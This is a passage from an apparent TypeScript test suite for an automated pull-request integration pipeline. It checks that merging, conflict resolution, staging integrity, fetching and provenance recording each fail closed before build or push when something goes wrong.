        throw new Error('unexpected pipeline exception')
      },
      releaseRepo: 'anomalyco/opencode',
      integrationRefs: [],
      workDir,
      dryRun: true,
    }

    try {
      // #when
      const execution = runIntegration(
        unexpectedConfig,
        makeAdapters({
          dispose: async () => {
            disposed = true
            throw new Error('cleanup failed')
          },
        }),
      )

      // #then
      await expect(execution).rejects.toThrow('unexpected pipeline exception')
      expect(disposed).toBe(true)
    } finally {
      await fs.rm(workDir, {recursive: true, force: true})
    }
  })

  it('fails before merge completion when post-stage unmerged validation fails', async () => {
    // #given
    const dir = await makeTmpDir()
    const events: string[] = []
    const adapters = makeAdapters({
      mergeRef: async () => ({kind: 'conflict', conflictPaths: ['conflict.txt']}),
      resolveConflict: async () => ({
        ok: true,
        attempts: 1,
        resolvedPaths: ['conflict.txt'],
        resolvedDigests: {'conflict.txt': 'accepted-digest'},
        diagnostics: [],
      }),
      stagePaths: async () => {
        events.push('stage')
      },
      verifyStagedPaths: async () => {
        events.push('verify-staged')
      },
      assertNoUnmerged: async () => {
        events.push('assert-no-unmerged')
        throw new Error('unmerged entry remains')
      },
      completeMerge: async () => {
        events.push('complete-merge')
      },
      buildCli: async () => {
        events.push('build')
      },
      pushIntegration: async () => {
        events.push('push')
      },
    })

    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          workDir: dir,
          dryRun: false,
          pushTarget: {repository: 'https://github.com/fro-bot/agent.git', ref: 'refs/harness-integrate/1.15.13'},
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(false)
      expect(events).toEqual(['stage', 'verify-staged', 'assert-no-unmerged'])
      if (result.ok) throw new Error('expected unresolved merge to fail')
      expect(result.error).toMatch(/unmerged/i)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('does not reach merge completion, build, or push when staged bytes fail integrity validation', async () => {
    // #given
    const dir = await makeTmpDir()
    const events: string[] = []
    const adapters = makeAdapters({
      mergeRef: async () => ({kind: 'conflict', conflictPaths: ['conflict.txt']}),
      resolveConflict: async () => ({
        ok: true,
        attempts: 1,
        resolvedPaths: ['conflict.txt'],
        resolvedDigests: {'conflict.txt': 'accepted-digest'},
        diagnostics: [],
      }),
      stagePaths: async () => {
        events.push('stage')
      },
      verifyStagedPaths: async () => {
        events.push('verify-staged')
        throw new Error('staged bytes mismatch')
      },
      assertNoUnmerged: async () => {
        events.push('assert-no-unmerged')
      },
      completeMerge: async () => {
        events.push('complete-merge')
      },
      buildCli: async () => {
        events.push('build')
      },
      pushIntegration: async () => {
        events.push('push')
      },
    })

    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          workDir: dir,
          dryRun: false,
          pushTarget: {repository: 'https://github.com/fro-bot/agent.git', ref: 'refs/harness-integrate/1.15.13'},
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(false)
      expect(events).toEqual(['stage', 'verify-staged'])
      if (result.ok) throw new Error('expected staged integrity failure')
      expect(result.error).toMatch(/staged bytes mismatch/i)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('does not construct or invoke the conflict resolver for a clean merge', async () => {
    // #given
    const dir = await makeTmpDir()
    let resolverCalled = false
    const adapters = makeAdapters({
      resolveConflict: async () => {
        resolverCalled = true
        throw new Error('clean merges must not invoke the resolver')
      },
    })

    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          workDir: dir,
          dryRun: true,
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(true)
      expect(resolverCalled).toBe(false)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('fails the integration after resolver attempt exhaustion without reaching build or push', async () => {
    // #given
    const dir = await makeTmpDir()
    let buildCalled = false
    let pushCalled = false
    const adapters = makeAdapters({
      mergeRef: async () => ({kind: 'conflict', conflictPaths: ['packages/opencode/src/session/prompt.ts']}),
      resolveConflict: async () => ({
        ok: false,
        attempts: 2,
        error: 'conflict resolver exhausted its two attempts',
        diagnostics: [],
      }),
      buildCli: async () => {
        buildCalled = true
      },
      pushIntegration: async () => {
        pushCalled = true
      },
    })

    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          workDir: dir,
          dryRun: false,
          pushTarget: {repository: 'https://github.com/fro-bot/agent.git', ref: 'refs/harness-integrate/1.15.13'},
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(false)
      expect(buildCalled).toBe(false)
      expect(pushCalled).toBe(false)
      if (result.ok) throw new Error('expected resolver exhaustion to fail')
      expect(result.error).toMatch(/exhaust|attempt/i)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('fails closed when an anonymous source fetch requires authentication', async () => {
    // #given
    const dir = await makeTmpDir()
    let mergeCalled = false
    const adapters = makeAdapters({
      fetchRef: async () => {
        throw new Error('authentication required for public source')
      },
      mergeRef: async () => {
        mergeCalled = true
        return {kind: 'clean'}
      },
    })

    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          workDir: dir,
          dryRun: true,
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(false)
      expect(mergeCalled).toBe(false)
      if (result.ok) throw new Error('expected anonymous fetch failure')
      expect(result.stage).toBe('fetch')
      expect(result.error).toMatch(/30182|authentication/i)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('fails hard when a fetched source cannot be represented in provenance', async () => {
    // #given
    const dir = await makeTmpDir()
    await fs.writeFile(path.join(dir, 'legacy-prompt.txt'), 'legacy prompt', 'utf8')
    const adapters = makeAdapters({
      captureRefSha: async () => null,
    })

    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          workDir: dir,
          promptPath: path.join(dir, 'legacy-prompt.txt'),
          dryRun: true,
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(false)
      if (result.ok) throw new Error('expected provenance failure')
      expect(result.error).toMatch(/provenance|SHA/i)
      expect(await readProvenanceManifest(dir)).toBeNull()
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })
})

// ---------------------------------------------------------------------------
// B1: empty-string SHA fails provenance validation
// ---------------------------------------------------------------------------

describe('per-ref SHA: empty-string and mixed capture failure', () => {
  it('captureRefSha returns empty string → fails before freezing provenance', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      await fs.writeFile(
        path.join(dir, 'prompt.txt'),
        'dummy {{tag}} {{branch}} {{merges}} {{sources}} {{repo}} {{version}} {{channel}} {{base}} {{release_repo}} {{release_url}} {{branches}}',
      )
      const integrationCommit = 'fallbackForEmptyString'
      const adapters = makeAdapters({
        // captureRefSha returns empty string (not null, but still invalid)
        captureRefSha: async () => '',
        getCommitSha: async () => integrationCommit,
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/1'],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then — an empty resolved source SHA is not publishable provenance
      expect(result.ok).toBe(false)
      if (result.ok) throw new Error('expected failure result')
      expect(result.error).toMatch(/SHA|provenance/i)
      expect(await readProvenanceManifest(dir)).toBeNull()
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  // ---------------------------------------------------------------------------
  // B2: MIXED per-ref capture (success, null, success) fails provenance validation
  // ---------------------------------------------------------------------------

  it('mixed capture (success, null, success) → fails at the missing source SHA', async () => {
    // #given
    const dir = await makeTmpDir()
    try {
      await fs.writeFile(
        path.join(dir, 'prompt.txt'),
        'dummy {{tag}} {{branch}} {{merges}} {{sources}} {{repo}} {{version}} {{channel}} {{base}} {{release_repo}} {{release_url}} {{branches}}',
      )
      const integrationCommit = 'integrationCommitForMixed'
      // captureRefSha returns: success, null, success
      const captureResults: (string | null)[] = ['sha-for-ref-0', null, 'sha-for-ref-2']
      let captureCallCount = 0
      const adapters = makeAdapters({
        captureRefSha: async () => {
          const sha = captureResults[captureCallCount] ?? null
          captureCallCount++
          return sha
        },
        getCommitSha: async () => integrationCommit,
      })

      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [
            'https://github.com/anomalyco/opencode/pull/1',
            'https://github.com/anomalyco/opencode/pull/2',
            'https://github.com/anomalyco/opencode/pull/3',
          ],
          agent: 'build',
          model: 'anthropic/claude-sonnet-4-6',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath: path.join(dir, 'prompt.txt'),
        },
        adapters,
      )

      // #then — a partial source ledger is not publishable provenance
      expect(result.ok).toBe(false)
      if (result.ok) throw new Error('expected failure result')
      expect(result.error).toMatch(/SHA|provenance/i)
      expect(await readProvenanceManifest(dir)).toBeNull()
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })
})
